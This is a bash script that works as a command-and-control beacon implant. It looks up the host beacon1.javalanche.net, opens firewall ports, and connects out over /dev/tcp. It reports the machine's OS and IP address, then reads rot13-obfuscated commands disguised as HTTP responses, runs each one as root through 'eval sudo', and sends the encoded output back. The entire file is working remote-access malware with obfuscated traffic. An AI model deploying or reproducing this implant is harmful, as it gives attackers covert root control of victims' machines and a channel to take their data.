#!/bin/bash

sleep 60

# resolve ip address
beaconIPAddress=$(nslookup beacon1.javalanche.net | grep Address | tail -n 1 | cut -b 10-)

# Add fiewall rules
sudo iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT
sudo iptables -A OUTPUT -p tcp --dport 443 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT

# Create TCP connection to the server
exec 3<>/dev/tcp/$beaconIPAddress/80

# Check to make sure that the connection was set up properly
if [ $? -ne 0 ]; then
    exit 1
fi

# Send initial message to C2
echo "Linux" >&3

# Send IP Address message to C2
ipaddress=$(ip addr | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | grep -v '^127\.0\.0\.1$' | head -n 1)
echo "$ipaddress" >&3

rot13() {
  echo "$1" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
}

send_keep_alive() {
  while true; do
    sleep 30
    keepalive=$(rot13 "KEEP_ALIVE")

    # Check to make sure that our connection is still alive
    if [ $? -ne 0 ]; then
      exit 1
    fi

    echo "$keepalive" >&3
  done
}

# Start keep-alive messages in the background
send_keep_alive &

# Get messages from the C2
while true; do

  # Check to make sure that tcp connection is still alive
  if [ $? -ne 0 ]; then
    exit 1
  fi

  # Read command from the C2
  if read -t 1 command <&3; then

    # Remove /r from the end of each line.
    command=$(echo "$command" | tr -d '\r')

    # Because we are disguising this in an HTTP packet, there are a bunch of lines we don't care about
    if [[ "$command" != "HTTP/1.1 200 OK" ]] && [[ "$command" != "Content-Length"* ]] && [[ "$command" != "Content-Type: text/plain; charset=utf-8" ]] && [[ -n "$command" ]]; then

      # Convert Cipher text to plain text
      command=$(rot13 "$command")

      if [ "$command" != "KEEP_ALIVE" ]; then

        # Run the command
        result=$(eval "sudo $command")

        # Convert the result into cipher text
        result=$(rot13 "$result")

        # Send the result back to the Beacon
        echo "$result" >&3
      fi
    fi
  fi
done